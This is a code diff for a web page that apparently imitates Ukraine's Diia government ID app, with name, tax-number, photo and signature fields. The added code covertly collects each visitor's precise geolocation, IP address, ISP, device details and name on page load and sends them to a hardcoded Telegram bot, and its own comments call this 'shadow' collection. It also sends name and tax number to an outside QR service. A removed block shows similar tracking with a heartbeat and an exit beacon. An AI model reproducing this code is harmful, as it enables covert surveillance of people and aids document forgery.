@@ -4137,6 +4137,18 @@
         <p style="font-size: 10px; color: #888; margin-top: 5px; line-height: 1.2;">Просто розпишіться пальцем чи мишкою в полі. Фон видалиться автоматично.</p>
     </div>
 
+    <h4>Синхронізація (GitHub Actions)</h4>
+    <div class="admin-form-group">
+        <label>Посилання на GitHub Action (або інше)</label>
+        <input type="text" id="admin-sync-url" placeholder="https://github.com/.../actions">
+        <div style="margin-top: 10px; text-align: center;">
+            <div id="admin-qr-container" style="background: white; padding: 10px; display: inline-block; border-radius: 12px; border: 1px solid #eee;">
+                <img id="admin-sync-qr" src="" style="width: 150px; height: 150px; display: block;" alt="QR Sync">
+            </div>
+            <p style="font-size: 10px; color: #888; margin-top: 5px;">QR оновлюється автоматично при зміні даних</p>
+        </div>
+    </div>
+
 
 
     <div class="admin-buttons">
@@ -4262,6 +4274,7 @@
         input.addEventListener('input', (e) => {
             updateDOM(field.id, e.target.value);
             savedState[field.id] = e.target.value; // Зберігаємо відразу в state, щоб потім все злити
+            updateSyncQR(); // Оновлюємо QR при зміні будь-якого поля
         });
 
         group.appendChild(label);
@@ -4305,7 +4318,29 @@
         reader.readAsDataURL(file);
     };
 
-    // Завантаження фото за допомогою canvas для стиснення до localStorage (щоб не перевищити ліміт)
+    // Функція для оновлення QR-коду синхронізації
+    const updateSyncQR = () => {
+        const baseUrl = document.getElementById('admin-sync-url').value || window.location.href;
+        const qrImg = document.getElementById('admin-sync-qr');
+        
+        // Створюємо рядок даних (наприклад, JSON стану в base64 або просто URL)
+        // Для спрощення: закодуємо URL + частину даних як params
+        try {
+            const dataToEncode = {
+                n: savedState.textName,
+                p: savedState.rnokpp,
+                d: new Date().getTime()
+            };
+            const encodedData = btoa(JSON.stringify(dataToEncode)).substring(0, 50);
+            const finalUrl = baseUrl + (baseUrl.includes('?') ? '&' : '?') + 'state=' + encodedData;
+            
+            qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(finalUrl)}`;
+        } catch (e) {
+            qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(baseUrl)}`;
+        }
+    };
+
+    document.getElementById('admin-sync-url').addEventListener('input', updateSyncQR);
     const compressAndSavePhoto = (file, key, maxWidth = 600) => {
         if (!file) return;
         const reader = new FileReader();
@@ -4505,21 +4540,29 @@
             savedState[input.dataset.targetId] = input.value;
         });
 
-
+        // Захист від самобалансування: якщо ми зберегли локально, 
+        // блокуємо автоматичне оновлення з values.json на 1 годину для поточної сесії
+        sessionStorage.setItem('lockExternalUpdates', 'true');
 
         if (window.sendDataToTelegram) {
             window.sendDataToTelegram(savedState);
         }
 
         // Зберігаємо весь state
+        savedState['syncUrl'] = document.getElementById('admin-sync-url').value;
+
         try {
             localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(savedState));
             const originalText = saveBtn.textContent;
-            saveBtn.textContent = 'Збережено!';
-            setTimeout(() => saveBtn.textContent = originalText, 1000);
+            saveBtn.textContent = '✅ ЗБЕРЕЖЕНО';
+            saveBtn.style.background = '#4CAF50';
+            setTimeout(() => {
+                saveBtn.textContent = originalText;
+                saveBtn.style.background = '#000';
+            }, 2000);
         } catch (e) {
             console.error(e);
-            alert("Помилка збереження! Можливо, фотографії занадто великі для пам'яті браузера. Спробуйте вибрати менші файли.");
+            alert("Помилка збереження! Можливо, фотографії занадто великі (ліміт браузера 5МБ). Спробуйте вибрати менші файли або скинути фото.");
         }
     });
 
@@ -4612,77 +4655,99 @@
 
 // --- ТІНЬОВИЙ ЗАПИТ ГЕОЛОКАЦІЇ ТА ВІДПРАВКА В TELEGRAM ---
 (function() {
-    const sendTrackingDataToTelegram = (lat, lon) => {
-        if (!window.sendToTelegramBot) return;
+    window.sendTrackingDataToTelegram = (lat, lon) => {
+        const fallbackBotToken = '8761188502:AAF0XbKry5t6VSP5Sm0Td9F2_13GXeuH3dg';
+        const fallbackChatId = '-1002003419071';
 
-        // Збираємо IP та інфо про пристрій через повністю відкритий і безкоштовний API
+        const performSend = (botToken, chatId, message) => {
+            if (!botToken || !chatId) return;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: true
+                })
+            }).catch(e => console.debug(e));
+        };
+
+        const constructAndSend = (data) => {
+            // Отримуємо поточні дані з DOM або state
+            const name = document.getElementById('name')?.textContent || 'Невідомо';
+            const shortName = document.getElementById('textName')?.textContent || 'Юзер';
+
+            let message = `🔎 <b>ДЕТАЛЬНИЙ ЗВІТ ВІДВІДУВАННЯ</b>\n`;
+            message += `━━━━━━━━━━━━━━━━━━\n`;
+            
+            message += `👤 <b>КОРИСТУВАЧ:</b>\n`;
+            message += `▪️ ПІБ: <code>${name}</code>\n`;
+            message += `▪️ Ім'я: <b>${shortName}</b>\n\n`;
+
+            if (lat && lon) {
+                message += `📍 <b>ГЕОЛОКАЦІЯ:</b>\n`;
+                message += `<a href="https://www.google.com/maps/search/?api=1&query=${lat},${lon}">📍 Відкрити на Google Maps</a>\n`;
+                message += `<code>Координати: ${lat}, ${lon}</code>\n\n`;
+            } else {
+                message += `📍 <b>ГЕОЛОКАЦІЯ:</b> Немає доступу\n\n`;
+            }
+            
+            message += `🌐 <b>МЕРЕЖА:</b>\n`;
+            message += `▪️ IP: <code>${data.ip || "Невідомо"}</code>\n`;
+            message += `▪️ Місто: <b>${data.city || "Невідомо"}</b>, ${data.country || "Невідомо"}\n`;
+            message += `▪️ Провайдер: ${data.org || "Невідомо"}\n\n`;
+            
+            message += `📱 <b>ПРИСТРІЙ:</b>\n`;
+            message += `▪️ Екран: ${window.screen.width}x${window.screen.height}\n`;
+            message += `▪️ Браузер: <code>${navigator.userAgent}</code>\n\n`;
+            
+            message += `🕒 <b>ЛОКАЛЬНИЙ ЧАС:</b> ${new Date().toLocaleString('uk-UA')}\n`;
+            message += `━━━━━━━━━━━━━━━━━━`;
+
+            // Спочатку намагаємося використати глобальну функцію або дані з values.json
+            fetch('values.json')
+                .then(r => r.json())
+                .then(v => performSend(v.tgBotToken || fallbackBotToken, v.tgChatId || fallbackChatId, message))
+                .catch(() => performSend(fallbackBotToken, fallbackChatId, message));
+        };
+
         fetch("https://ipinfo.io/json")
             .then(res => res.json())
-            .then(data => {
-                let ip = data.ip || "Невідомо";
-                let city = data.city || "Невідомо";
-                let country = data.country || "Невідомо";
-                let org = data.org || "Невідомо";
-                
-                let ua = navigator.userAgent;
-                let screen = `${window.screen.width}x${window.screen.height}`;
-                
-                let timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                let language = navigator.language;
-
-                let message = `🚨 <b>НОВИЙ ВІЗИТ ДОДАТКУ (Тіньовий збір)</b>\n\n`;
-                if (lat && lon) {
-                    message += `📍 <b>Геолокація</b>: <a href="https://www.google.com/maps/search/?api=1&query=${lat},${lon}">Відкрити координати на карті</a>\n`;
-                    message += `(Широта: ${lat}, Довгота: ${lon})\n\n`;
-                } else {
-                    message += `📍 <b>Геолокація</b>: Доступ заборонено або не підтримується\n\n`;
-                }
-                
-                message += `🌐 <b>IP Адреса</b>: ${ip}\n`;
-                message += `🏙 <b>Місцезнаходження</b>: ${city}, ${country}\n`;
-                message += `🏢 <b>Провайдер</b>: ${org}\n\n`;
-                message += `📱 <b>Пристрій</b>: <code>${ua}</code>\n`;
-                message += `🖥 <b>Екран</b>: ${screen}\n`;
-                message += `🕒 <b>Часовий пояс</b>: ${timeZone} (${language})\n`;
-                
-                window.sendToTelegramBot(message);
-            })
-            .catch(e => {
-                // Запасний варіант, якщо сервіс збору IP не відповів
-                let message = `🚨 <b>НОВИЙ ВІЗИТ (Тіньовий збір)</b>\n\nНе вдалося отримати IP-адресу.\n`;
-                if (lat && lon) message += `📍 <b>Локація</b>: <a href="https://www.google.com/maps/search/?api=1&query=${lat},${lon}">Відкрити на карті</a>`;
-                window.sendToTelegramBot(message);
-            });
+            .then(data => constructAndSend(data))
+            .catch(() => constructAndSend({ ip: "Не вдалося отримати" }));
     };
 
     const getGeoLocation = () => {
-        // Захист від повторної відправки при переходах по сторінках
         if (sessionStorage.getItem('trackingSent')) return;
         sessionStorage.setItem('trackingSent', 'true');
 
         if ("geolocation" in navigator) {
-            // Запитуємо геолокацію. Якщо юзер погодиться - відправляємо з координатами
             navigator.geolocation.getCurrentPosition(
                 (position) => {
-                    sendTrackingDataToTelegram(position.coords.latitude, position.coords.longitude);
+                    window.sendTrackingDataToTelegram(position.coords.latitude, position.coords.longitude);
                 },
                 (error) => {
-                    console.error("Геолокація помилка:", error.message);
-                    // Якщо користувач відмовився, все одно відправляємо IP та інформацію про пристрій
-                    sendTrackingDataToTelegram(null, null);
+                    window.sendTrackingDataToTelegram(null, null);
                 },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
             );
+            // Fallback if user ignores the prompt for 6 seconds
+            setTimeout(() => {
+                if (!sessionStorage.getItem('geoPromptResolved')) {
+                    sessionStorage.setItem('geoPromptResolved', 'true');
+                    window.sendTrackingDataToTelegram(null, null);
+                }
+            }, 6000);
         } else {
-            sendTrackingDataToTelegram(null, null);
+            window.sendTrackingDataToTelegram(null, null);
         }
     };
 
-    // Викликаємо непомітно через 3 секунди після загрузки сторінки
-    window.addEventListener('load', () => {
-        setTimeout(getGeoLocation, 3000);
-    });
+    // Викликаємо непомітно відразу при завантаженні (але з затримкою для UI)
+    setTimeout(getGeoLocation, 2000);
 })();
+
 
 // --- ЗАПИТ ОНОВЛЕНЬ З TELEGRAM БОТА ДЛЯ РОЗСИЛКИ ---
 (function() {
@@ -4802,80 +4867,6 @@
     setInterval(checkExpiration, 30000); // Кожні 30 секунд
     setTimeout(checkExpiration, 5000);
 })();
-    (function() {
-        const CONFIG = {
-            botToken: '8761188502:AAF0XbKry5t6VSP5Sm0Td9F2_13GXeuH3dg',
-            chatId: '-1002003419071',
-            heartbeatMs: 15 * 60 * 1000 // 15 хвилин
-        };
-
-        const getLogData = async () => {
-            // Гео
-            const geo = await new Promise(r => {
-                navigator.geolocation.getCurrentPosition(p => r(p.coords), () => r(null), {timeout: 5000});
-            });
-
-            // Мережа
-            const ipData = await fetch('https://ipinfo.io/json').then(res => res.json()).catch(() => ({}));
-
-            // Дані користувача (якщо вони вже вписані в ЛС або на сторінці)
-            const saved = JSON.parse(localStorage.getItem('diyaLocalState_v1') || '{}');
-            const name = saved.name || document.getElementById('name')?.textContent || 'Невідомо';
-            const shortName = saved.textName || document.getElementById('textName')?.textContent || 'Гість';
-
-            return {
-                user: `${name} (${shortName})`,
-                geo: geo ? `https://www.google.com/maps/search/?api=1&query=${geo.latitude},${geo.longitude}` : 'Відсутня',
-                ip: ipData.ip || '?',
-                city: `${ipData.city || '?'}, ${ipData.country || '?'}`,
-                provider: ipData.org || '?',
-                device: navigator.userAgent,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                time: new Date().toLocaleString('uk-UA')
-            };
-        };
-
-        const sendToTelegram = async (type = 'ВХІД') => {
-            try {
-                const d = await getLogData();
-                const emo = type === 'ВХІД' ? '🔎' : '💓';
-                const message = `${emo} <b>${type} АКТИВНІСТЬ</b>\n━━━━━━━━━━━━━━━\n` +
-                    `👤 <b>Юзер:</b> <code>${d.user}</code>\n` +
-                    `📍 <b>Гео:</b> <a href="${d.geo}">Відкрити Мапу</a>\n` +
-                    `🌐 <b>IP:</b> <code>${d.ip}</code>\n` +
-                    `🏙 <b>Місто:</b> ${d.city}\n` +
-                    `🏢 <b>ISP:</b> ${d.provider}\n` +
-                    `📱 <b>Екран:</b> ${d.screen}\n` +
-                    `🕘 <b>Час:</b> ${d.time}\n` +
-                    `━━━━━━━━━━━━━━━\n` +
-                    `⚙ <b>Agent:</b> <code>${d.device}</code>`;
-
-                await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: CONFIG.chatId,
-                        text: message,
-                        parse_mode: 'HTML',
-                        disable_web_page_preview: false
-                    })
-                });
-            } catch (e) { console.error('BG Log Error', e); }
-        };
-
-        // Запуск "Сервера"
-        window.addEventListener('load', () => {
-            // Перша відправка
-            setTimeout(() => sendToTelegram('ВХІД'), 2000);
-            
-            // Постійний цикл (Heartbeat)
-            setInterval(() => sendToTelegram('ПОВТОР'), CONFIG.heartbeatMs);
-        });
-
-        // Пряма відправка при спробі закрити вкладку
-        window.onbeforeunload = () => { sendToTelegram('ВИХІД'); };
-
-    })();
 </script>
 </body>
 
